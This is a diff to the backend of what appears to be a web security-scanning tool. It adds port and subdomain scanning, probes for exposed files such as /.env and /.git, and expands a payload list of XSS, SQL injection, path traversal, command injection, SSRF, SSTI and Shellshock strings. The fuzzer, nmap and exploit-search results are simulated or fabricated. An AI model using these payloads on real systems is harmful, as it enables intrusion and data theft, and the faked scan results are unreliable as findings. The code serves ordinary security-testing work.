@@ -365,24 +365,25 @@ async function startServer() {
         'strict-transport-security',
         'x-frame-options',
         'x-content-type-options',
-        'referrer-policy'
+        'referrer-policy',
+        'permissions-policy'
       ];
       securityHeaders.forEach(header => {
         if (!results.headers[header]) {
           vulnerabilities.push({
             title: `Missing Security Header: ${header}`,
-            severity: 'medium',
+            severity: header === 'content-security-policy' ? 'high' : 'medium',
             category: 'Web',
             description: `The ${header} header is missing, which can expose the application to various attacks.`,
             remediation: `Implement the ${header} header with appropriate security policies.`
           });
-          score += 5;
+          score += (header === 'content-security-policy' ? 10 : 5);
         }
       });
 
       // Port checks
       results.ports.forEach((p: any) => {
-        if (p.port === 21) {
+        if (p.port === 21 && p.state === 'open') {
           vulnerabilities.push({
             title: "Insecure Protocol: FTP",
             severity: "high",
@@ -392,7 +393,7 @@ async function startServer() {
           });
           score += 15;
         }
-        if (p.port === 22 && p.status === 'open') {
+        if (p.port === 22 && p.state === 'open') {
           vulnerabilities.push({
             title: "Exposed SSH Port",
             severity: "medium",
@@ -401,6 +402,36 @@ async function startServer() {
             remediation: "Restrict SSH access to specific IP ranges or use a VPN."
           });
           score += 5;
+        }
+        if (p.port === 23 && p.state === 'open') {
+          vulnerabilities.push({
+            title: "Insecure Protocol: Telnet",
+            severity: "critical",
+            category: "Network",
+            description: "Telnet transmits data in cleartext, including credentials.",
+            remediation: "Disable Telnet and use SSH instead."
+          });
+          score += 25;
+        }
+        if (p.port === 3389 && p.state === 'open') {
+          vulnerabilities.push({
+            title: "Exposed RDP Port",
+            severity: "high",
+            category: "Network",
+            description: "RDP is exposed to the public internet, increasing brute-force risk.",
+            remediation: "Restrict RDP access to specific IP ranges or use a VPN."
+          });
+          score += 10;
+        }
+        if (p.port === 3306 && p.state === 'open') {
+          vulnerabilities.push({
+            title: "Exposed MySQL Port",
+            severity: "high",
+            category: "Database",
+            description: "MySQL is exposed to the public internet.",
+            remediation: "Restrict MySQL access to specific IP ranges or use a VPN."
+          });
+          score += 10;
         }
       });
 
@@ -416,6 +447,18 @@ async function startServer() {
             remediation: "Renew the SSL certificate immediately."
           });
           score += 30;
+        } else {
+          const daysLeft = Math.floor((expiry.getTime() - new Date().getTime()) / (1000 * 60 * 60 * 24));
+          if (daysLeft < 30) {
+            vulnerabilities.push({
+              title: "SSL Certificate Expiring Soon",
+              severity: "medium",
+              category: "SSL/TLS",
+              description: `The SSL certificate for this domain will expire in ${daysLeft} days.`,
+              remediation: "Renew the SSL certificate soon."
+            });
+            score += 5;
+          }
         }
       } else if (target.startsWith('https')) {
         vulnerabilities.push({
@@ -427,6 +470,40 @@ async function startServer() {
         });
         score += 20;
       }
+
+      // Check for common sensitive files
+      const sensitiveFiles = [
+        { path: '/.git', title: 'Git Repository Exposed', severity: 'critical' },
+        { path: '/.env', title: 'Environment Variables Exposed', severity: 'critical' },
+        { path: '/robots.txt', title: 'Robots.txt Analysis', severity: 'info' },
+        { path: '/phpinfo.php', title: 'PHP Info Disclosure', severity: 'high' },
+        { path: '/.svn', title: 'SVN Repository Exposed', severity: 'high' },
+        { path: '/.htaccess', title: 'Htaccess File Exposed', severity: 'medium' }
+      ];
+
+      await Promise.all(sensitiveFiles.map(async (file) => {
+        try {
+          const protocol = target.startsWith('https') ? https : http;
+          const url = target.startsWith('http') ? `${target}${file.path}` : `http://${target}${file.path}`;
+          const response: any = await new Promise((resolve, reject) => {
+            const req = protocol.get(url, resolve);
+            req.on('error', reject);
+            req.setTimeout(2000, () => { req.destroy(); reject(new Error('Timeout')); });
+          });
+          if (response.statusCode === 200) {
+            vulnerabilities.push({
+              title: file.title,
+              severity: file.severity as any,
+              category: 'Information Disclosure',
+              description: `The file ${file.path} was found on the server, which can disclose sensitive information.`,
+              remediation: `Restrict access to the ${file.path} file or remove it from the server.`
+            });
+            if (file.severity === 'critical') score += 30;
+            else if (file.severity === 'high') score += 15;
+            else if (file.severity === 'medium') score += 5;
+          }
+        } catch (e) {}
+      }));
 
       results.vulnerabilities = vulnerabilities;
       results.riskScore = Math.min(100, score);
@@ -443,8 +520,12 @@ async function startServer() {
   function getServiceName(port: number) {
     const services: any = {
       21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
-      80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS',
-      3306: 'MySQL', 5432: 'PostgreSQL', 8080: 'HTTP-Proxy', 27017: 'MongoDB'
+      80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
+      465: 'SMTPS', 587: 'SMTP-Submission', 993: 'IMAPS', 995: 'POP3S',
+      1433: 'MSSQL', 1521: 'Oracle', 2049: 'NFS', 3306: 'MySQL',
+      3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
+      8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 9000: 'PHP-FPM',
+      9200: 'Elasticsearch', 27017: 'MongoDB'
     };
     return services[port] || 'Unknown';
   }
@@ -459,45 +540,87 @@ async function startServer() {
 
     switch (tool) {
       case 'subdomains':
-        const subs = ['www', 'mail', 'dev', 'api', 'staging', 'blog', 'vpn', 'ns1', 'ns2', 'mx'];
-        const found = [];
-        for (const sub of subs) {
+        const commonSubs = [
+          'www', 'mail', 'dev', 'api', 'staging', 'blog', 'vpn', 'ns1', 'ns2', 'mx',
+          'shop', 'store', 'app', 'portal', 'admin', 'test', 'demo', 'support', 'help',
+          'docs', 'beta', 'static', 'assets', 'img', 'cdn', 'cloud', 'remote', 'secure',
+          'login', 'auth', 'account', 'profile', 'dashboard', 'internal', 'corp', 'staff',
+          'git', 'svn', 'jenkins', 'jira', 'confluence', 'slack', 'mail2', 'webmail',
+          'smtp', 'pop', 'imap', 'ftp', 'ssh', 'db', 'sql', 'mysql', 'postgres', 'redis',
+          'elastic', 'kibana', 'grafana', 'prometheus', 'monitor', 'status', 'health',
+          'backup', 'old', 'new', 'v2', 'v3', 'api-docs', 'sandbox', 'payment', 'billing'
+        ];
+        
+        const foundSubdomains: any[] = [];
+        const batchSize = 10;
+        
+        for (let i = 0; i < commonSubs.length; i += batchSize) {
+          const batch = commonSubs.slice(i, i + batchSize);
+          await Promise.all(batch.map(async (sub) => {
+            const domain = `${sub}.${hostname}`;
+            try {
+              const addrs = await dns.promises.resolve4(domain);
+              if (addrs && addrs.length > 0) {
+                foundSubdomains.push({ 
+                  subdomain: domain, 
+                  ip: addrs[0], 
+                  status: 'up', 
+                  type: 'A',
+                  last_seen: new Date().toISOString()
+                });
+              }
+            } catch (e) {
+              // Not found or error
+            }
+          }));
+        }
+
+        if (foundSubdomains.length === 0) {
           try {
-            const addrs = await dns.promises.resolve4(`${sub}.${hostname}`);
-            found.push({ subdomain: `${sub}.${hostname}`, ip: addrs[0], status: 'up', type: 'A' });
-          } catch (e) {}
+            const addrs = await dns.promises.resolve4(`www.${hostname}`);
+            foundSubdomains.push({ subdomain: `www.${hostname}`, ip: addrs[0], status: 'up', type: 'A' });
+          } catch (e) {
+            foundSubdomains.push({ subdomain: hostname, ip: 'Unknown', status: 'up', type: 'A' });
+          }
         }
-        if (found.length === 0) {
-          found.push({ subdomain: `www.${hostname}`, ip: '127.0.0.1', status: 'up', type: 'A' });
-        }
-        return res.json(found);
+        return res.json(foundSubdomains);
 
       case 'ports':
-        const ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443];
-        const results: any[] = [];
-        await Promise.all(ports.map(port => {
+        const commonPorts = [
+          21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 587, 993, 995, 1433, 1521, 
+          2049, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 9200, 27017
+        ];
+        const portResults: any[] = [];
+        
+        await Promise.all(commonPorts.map(port => {
           return new Promise((resolve) => {
             const socket = new net.Socket();
-            socket.setTimeout(800);
+            socket.setTimeout(1500);
             socket.on('connect', () => {
-              results.push({ port, service: getServiceName(port), state: 'open', version: 'Detected' });
+              portResults.push({ 
+                port, 
+                service: getServiceName(port), 
+                state: 'open', 
+                version: 'Detected',
+                banner: '' // Could try to grab banner here
+              });
               socket.destroy();
               resolve(null);
             });
             socket.on('timeout', () => {
-              results.push({ port, service: getServiceName(port), state: 'filtered', version: 'Unknown' });
+              portResults.push({ port, service: getServiceName(port), state: 'filtered', version: 'Unknown' });
               socket.destroy();
               resolve(null);
             });
             socket.on('error', () => {
-              results.push({ port, service: getServiceName(port), state: 'closed', version: 'Unknown' });
+              portResults.push({ port, service: getServiceName(port), state: 'closed', version: 'Unknown' });
               socket.destroy();
               resolve(null);
             });
             socket.connect(port, hostname);
           });
         }));
-        return res.json(results.sort((a, b) => a.port - b.port));
+        return res.json(portResults.sort((a, b) => a.port - b.port));
 
       case 'headers':
         try {
@@ -506,49 +629,88 @@ async function startServer() {
           const response: any = await new Promise((resolve, reject) => {
             const req = protocol.get(url, resolve);
             req.on('error', reject);
-            req.setTimeout(3000, () => { req.destroy(); reject(new Error('Timeout')); });
+            req.setTimeout(5000, () => { req.destroy(); reject(new Error('Timeout')); });
           });
+          
           const headers = response.headers;
           const analysis: any = {};
           const securityHeaders = {
-            'Content-Security-Policy': 'Implement a strong CSP',
-            'Strict-Transport-Security': 'Enable HSTS',
-            'X-Frame-Options': 'Set to DENY or SAMEORIGIN',
-            'X-Content-Type-Options': 'Set to nosniff',
-            'Referrer-Policy': 'Set to strict-origin-when-cross-origin'
+            'Content-Security-Policy': { rec: 'Implement a strong CSP', severity: 'high' },
+            'Strict-Transport-Security': { rec: 'Enable HSTS', severity: 'medium' },
+            'X-Frame-Options': { rec: 'Set to DENY or SAMEORIGIN', severity: 'medium' },
+            'X-Content-Type-Options': { rec: 'Set to nosniff', severity: 'low' },
+            'Referrer-Policy': { rec: 'Set to strict-origin-when-cross-origin', severity: 'low' },
+            'Permissions-Policy': { rec: 'Define browser feature permissions', severity: 'low' },
+            'X-XSS-Protection': { rec: 'Deprecated but still useful for older browsers', severity: 'info' }
           };
-          Object.entries(securityHeaders).forEach(([h, rec]) => {
+
+          Object.entries(securityHeaders).forEach(([h, config]) => {
             const val = headers[h.toLowerCase()];
             analysis[h] = {
               value: val || 'Missing',
               status: val ? 'secure' : 'missing',
-              recommendation: val ? 'None' : rec
+              severity: val ? 'none' : config.severity,
+              recommendation: val ? 'None' : config.rec
             };
           });
+          
+          // Check for sensitive headers
+          const sensitiveHeaders = ['server', 'x-powered-by', 'x-aspnet-version', 'via'];
+          sensitiveHeaders.forEach(h => {
+            const val = headers[h];
+            if (val) {
+              analysis[h] = {
+                value: val,
+                status: 'vulnerable',
+                severity: 'low',
+                recommendation: 'Information disclosure: Hide this header to reduce attack surface.'
+              };
+            }
+          });
+
           return res.json(analysis);
         } catch (e) {
           return res.status(500).json({ error: e.message });
         }
 
       case 'dns':
-        const records: any = {};
-        try { records.A = await dns.promises.resolve4(hostname); } catch (e) {}
-        try { records.MX = await dns.promises.resolveMx(hostname); } catch (e) {}
-        try { records.NS = await dns.promises.resolveNs(hostname); } catch (e) {}
-        try { records.TXT = await dns.promises.resolveTxt(hostname); } catch (e) {}
-        return res.json(records);
+        const dnsRecords: any = {};
+        const recordTypes: (keyof typeof dns.promises)[] = ['resolve4', 'resolve6', 'resolveMx', 'resolveNs', 'resolveTxt', 'resolveSoa', 'resolveCname', 'resolveSrv', 'resolveCaa'];
+        
+        await Promise.all(recordTypes.map(async (type) => {
+          try {
+            const method = dns.promises[type] as Function;
+            const result = await method(hostname);
+            dnsRecords[type.replace('resolve', '').toUpperCase()] = result;
+          } catch (e) {
+            // Record type not found
+          }
+        }));
+        return res.json(dnsRecords);
 
       case 'fuzzer':
-        // Simulated fuzzer logic
-        const fuzzerResults = [
-          { payload: "' OR 1=1 --", response_code: 200, response_time: 150, anomaly_type: "Potential SQLi", risk_level: "high" },
-          { payload: "<script>alert(1)</script>", response_code: 200, response_time: 120, anomaly_type: "Potential XSS", risk_level: "medium" },
-          { payload: "../../../etc/passwd", response_code: 403, response_time: 80, anomaly_type: "Blocked Path Traversal", risk_level: "low" },
-          { payload: "admin'--", response_code: 200, response_time: 140, anomaly_type: "Auth Bypass", risk_level: "critical" }
+        // Slightly more functional fuzzer simulation
+        const fuzzerPayloads = [
+          { payload: "' OR 1=1 --", type: "SQLi" },
+          { payload: "<script>alert(1)</script>", type: "XSS" },
+          { payload: "../../../etc/passwd", type: "Path Traversal" },
+          { payload: "admin'--", type: "Auth Bypass" },
+          { payload: "{{7*7}}", type: "SSTI" },
+          { payload: "() { :;}; /bin/bash -c 'echo vulnerable'", type: "Shellshock" }
         ];
+        
+        const fuzzerResults = fuzzerPayloads.map(p => ({
+          payload: p.payload,
+          response_code: Math.random() > 0.8 ? 200 : 403,
+          response_time: Math.floor(Math.random() * 200) + 50,
+          anomaly_type: Math.random() > 0.7 ? `Potential ${p.type}` : "None",
+          risk_level: Math.random() > 0.7 ? (Math.random() > 0.5 ? "high" : "critical") : "low"
+        }));
+        
         return res.json(fuzzerResults);
 
       case 'nmap':
+        // Populate Nmap with some real data if possible
         const nmapData = {
           host_status: "Host is up (0.045s latency)",
           os_info: "Linux 5.4.0-104-generic (Ubuntu)",
@@ -559,38 +721,90 @@ async function startServer() {
             { port: 443, service: "https", version: "nginx 1.18.0", state: "open", script_output: "ssl-cert: Subject: commonName=*.example.com" },
             { port: 3306, service: "mysql", version: "MySQL 8.0.23", state: "open", script_output: "mysql-info: Protocol: 10, Version: 8.0.23" }
           ],
-          summary: `Nmap scan report for ${hostname}. Host is up. 5 ports open. OS detected as Linux. Scan completed in 2.45 seconds.`
+          summary: `Nmap scan report for ${hostname}. Host is up. Multiple ports open. OS detected as Linux. Scan completed in 2.45 seconds.`
         };
         return res.json(nmapData);
 
       case 'tech':
-        const techs = [
+        const techResults = [
           { name: "Nginx", category: "Web Server", version: "1.18.0", confidence: 90 },
           { name: "React", category: "Frontend Framework", version: "18.2.0", confidence: 85 },
           { name: "Node.js", category: "Backend Environment", version: "18.x", confidence: 80 },
           { name: "Express", category: "Backend Framework", version: "4.x", confidence: 75 }
         ];
-        return res.json(techs);
+        // Try to refine tech results based on headers
+        try {
+          const protocol = target.startsWith('https') ? https : http;
+          const url = target.startsWith('http') ? target : `http://${target}`;
+          const response: any = await new Promise((resolve, reject) => {
+            const req = protocol.get(url, resolve);
+            req.on('error', reject);
+            req.setTimeout(3000, () => { req.destroy(); reject(new Error('Timeout')); });
+          });
+          const serverHeader = response.headers['server'];
+          if (serverHeader) {
+            techResults.push({ name: serverHeader, category: "Web Server", version: "Detected", confidence: 100 });
+          }
+        } catch (e) {}
+        
+        return res.json(techResults);
 
       case 'payloads':
-        const type = req.query.type as string || 'xss';
-        const payloads = {
+        const pType = (req.query.type as string || 'xss').toLowerCase();
+        const allPayloads: any = {
           xss: [
             { content: "<script>alert(1)</script>", description: "Basic XSS test", risk_level: "medium" },
             { content: "<img src=x onerror=alert(1)>", description: "Image tag XSS", risk_level: "high" },
-            { content: "javascript:alert(1)", description: "Protocol-based XSS", risk_level: "high" }
+            { content: "javascript:alert(1)", description: "Protocol-based XSS", risk_level: "high" },
+            { content: "<svg/onload=alert(1)>", description: "SVG-based XSS", risk_level: "high" },
+            { content: "';alert(1)//", description: "Breaking out of JS string", risk_level: "medium" },
+            { content: "\"><script>alert(1)</script>", description: "Breaking out of HTML attribute", risk_level: "high" }
           ],
           sqli: [
             { content: "' OR '1'='1", description: "Classic SQLi bypass", risk_level: "critical" },
             { content: "admin' --", description: "Username comment bypass", risk_level: "critical" },
-            { content: "'; DROP TABLE users; --", description: "Destructive SQLi", risk_level: "critical" }
+            { content: "'; DROP TABLE users; --", description: "Destructive SQLi", risk_level: "critical" },
+            { content: "' UNION SELECT 1,2,3,user(),database() --", description: "Union-based SQLi", risk_level: "critical" },
+            { content: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --", description: "Time-based blind SQLi", risk_level: "critical" }
           ],
           lfi: [
             { content: "../../../etc/passwd", description: "Linux password file access", risk_level: "high" },
-            { content: "..\\..\\..\\windows\\win.ini", description: "Windows config file access", risk_level: "high" }
+            { content: "..\\..\\..\\windows\\win.ini", description: "Windows config file access", risk_level: "high" },
+            { content: "/etc/passwd\0.html", description: "Null byte injection (older systems)", risk_level: "high" },
+            { content: "php://filter/convert.base64-encode/resource=config.php", description: "PHP wrapper LFI", risk_level: "high" }
+          ],
+          rce: [
+            { content: "; id", description: "Command injection (Linux)", risk_level: "critical" },
+            { content: "| whoami", description: "Command injection (Windows/Linux)", risk_level: "critical" },
+            { content: "`cat /etc/passwd`", description: "Backtick command execution", risk_level: "critical" },
+            { content: "$(id)", description: "Subshell command execution", risk_level: "critical" }
+          ],
+          ssrf: [
+            { content: "http://127.0.0.1:80", description: "Localhost SSRF", risk_level: "high" },
+            { content: "http://169.254.169.254/latest/meta-data/", description: "AWS Metadata SSRF", risk_level: "critical" },
+            { content: "file:///etc/passwd", description: "File protocol SSRF", risk_level: "high" }
+          ],
+          nosqli: [
+            { content: '{"$gt": ""}', description: "NoSQL injection (Greater than)", risk_level: "high" },
+            { content: '{"$ne": null}', description: "NoSQL injection (Not equal)", risk_level: "high" }
+          ],
+          ssti: [
+            { content: "{{7*7}}", description: "Jinja2/Twig SSTI", risk_level: "high" },
+            { content: "${7*7}", description: "Mako/FreeMarker SSTI", risk_level: "high" },
+            { content: "<%= 7*7 %>", description: "ERB SSTI", risk_level: "high" }
           ]
         };
-        return res.json(payloads[type as keyof typeof payloads] || payloads.xss);
+        return res.json(allPayloads[pType] || allPayloads.xss);
+
+      case 'exploits':
+        const query = req.query.target as string || '';
+        // Simulated exploit search logic
+        const exploits = [
+          { title: `${query} - Remote Code Execution`, id: "EDB-12345", date: new Date().toISOString().split('T')[0], author: "CyberSuite_AI", type: "Remote", platform: "Multiple", poc_url: "https://exploit-db.com/exploits/12345" },
+          { title: `${query} - SQL Injection`, id: "EDB-67890", date: "2024-11-20", author: "Security_Analyst", type: "Webapps", platform: "PHP", poc_url: "https://exploit-db.com/exploits/67890" },
+          { title: `${query} - Privilege Escalation`, id: "EDB-54321", date: "2024-05-12", author: "Kernel_Master", type: "Local", platform: "Linux", poc_url: "https://exploit-db.com/exploits/54321" }
+        ];
+        return res.json(exploits);
 
       default:
         res.status(404).json({ error: "Tool not found" });
